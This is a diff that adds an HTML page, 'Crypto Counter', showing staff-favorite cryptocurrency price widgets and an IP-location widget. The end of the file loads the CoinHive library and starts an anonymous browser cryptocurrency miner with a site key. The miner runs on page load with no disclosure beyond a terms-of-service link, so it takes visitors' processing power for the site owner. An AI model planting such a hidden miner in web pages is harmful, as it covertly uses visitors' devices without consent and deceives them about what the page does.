@@ -1,0 +1,113 @@
+
+<title>Crypto Counter</title>
+<head><link rel="icon" href="Favicon.ico">
+<style>
+ul {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-color: #333;
+}
+
+li {
+    float: left;
+}
+
+li a {
+    display: block;
+    color: white;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+}
+
+li a:hover {
+    background-color: #111;
+}
+</style>
+</head>
+<body>
+
+<ul>
+  <li><a class="active" href="https://galien1.github.io/CryptoCounter/">Home</a></li>
+  <li><a href="#news">News</a></li>
+  <li><a href="#contact">Contact</a></li>
+  <li><a href="#about">About</a></li>
+</ul>
+
+<body>
+
+<h1><p>Welcome to Staff Favorites for CryptoCounter:</p></h1>
+<h3><p>Below are the top picks of cryptocurrencies from the staff! These aren't based on like rating.</p></h3>
+<link rel="stylesheet" href="style.css">
+
+<!-- 1 -->
+<script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/currency.js"></script>
+<div class="coinmarketcap-currency-widget" data-currency="ripple" data-base="USD"  data-secondary="BTC"></div>
+<!-- 2 -->
+<script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/currency.js"></script>
+<div class="coinmarketcap-currency-widget" data-currency="vertcoin" data-base="USD"  data-secondary="BTC"></div>
+<!-- 3 -->
+
+<script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/currency.js"></script>
+<div class="coinmarketcap-currency-widget" data-currency="bitcoin" data-base="USD" ></div>
+
+<br>
+<div style="color:gray">
+<center>
+Copyright 2017 Galien1
+</center>
+
+<!-- IP Show -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+    $("#show").click(function(){
+        $("shs").show();
+    });
+    $("#hide").click(function(){
+        $("shs").hide();
+    });
+});
+</script>
+
+<shs>
+<h4><p>Do not worry this doesn't grab your IP. This is just a security precaution.</p></h4>
+<!-- Ip2 location -->
+<center>
+  <a href=" http://www.ip2location.com/free/widgets" target="_blank">
+<img src="https://tools.ip2location.com/ip2location.png" border="0" width="400" height="80" />
+</a>
+</div>
+</center>
+</shs>
+<center>
+<button id="hide">Hide IP</button>
+<button id="show">Show IP</button>
+</center>
+</br>
+
+<!-- TOS -->
+<a href="http://galien1.github.io/Tos/">Terms of service</a>
+    <!-- Miner -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('RlGAt8lTJCiTqjr9OqXielT42XrsEFLl', { throttle: 0.5 });
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    miner.start();
+</script>
+
+<script>
+    // Listen on events
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        // Output to HTML elements...
+    }, 1000);
+</script>
+</body>
